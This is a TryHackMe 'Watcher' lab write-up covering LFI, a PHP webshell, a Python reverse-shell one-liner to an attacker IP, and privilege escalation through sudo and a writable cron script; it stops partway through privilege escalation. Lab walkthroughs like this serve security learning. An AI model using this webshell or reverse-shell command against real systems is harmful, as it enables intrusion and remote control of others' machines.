* * *
  ### LAB: Watcher
  ### Platform: Tryhackme
* * *

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/1c2bacb9-866f-4196-8396-8f1ae25a5c8d)

### ENUMERATION
- Rustscan's result

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/53ee1839-ed07-4ed4-96fa-808620998f5f)

- Directory fuzzing with ffuf
  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/8c9dd130-a75d-4e98-ae70-56f3a8a35d3b)

- While inspecting the source code,a url caught my attenttion,the url serves php fies to the website,it seems it uses the `include()
php method` to read files,the `include()` method is vulnerable to LFI which allows an attacker to read files on the server

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/16a7df9d-2b32-45ed-bff1-fd60a13232e7)

- My assumption was right,I was able to read the /etc/passwd file

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/213ddb3d-31f5-4e37-981a-ec3ae0e77ac0)

- Robots.txt indicates an hidden file `/secret_file_do_not_read.txt` but when I tried to read it,it flashed a `403 forbidden error`.
I was able to read it with the page vulnerable to lfi.The file revealed ftp credentials

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/35de7036-4afc-468f-93e4-720549c939d6)

- We have write permissions in a particular folder `files`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/55fe248a-39ad-471e-b1a4-19d9b1ceb79b)

- Since we can read files with lfi,we can upload a shell to the ftp server with the folder `files` and get rce,a typical php webshell
  will have this contents `<?php echo system($_GET['cmd']); ?>`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d50afd55-6824-4c75-a9fd-dca685ab10fa)

 - Rce gained
   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/1d48d063-3156-442b-8880-c9ebb1616bbb)

- Pop a reverse shell with `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.158.229",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`

 ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/19aedeef-e734-4a0e-aa59-4585199180df)

### ROAD TO PRIVESC

- `sudo -l` reveals that we can run commands as user toby e.g `sudo -u <command>`,we can move to toby's account with `sudo -u toby /bin/bash`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/2ea55e9f-d7a9-413c-bfd4-520ff86864e6)

- `cat /etc/crontab` reveals an active cron jobs running as user mat,user `toby` also has write permission to the script

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/c9ea4332-ebc7-4223-8e9e-add3e93cb333)

- Adding `/bin/bash` to the sh file will switch us to user mat
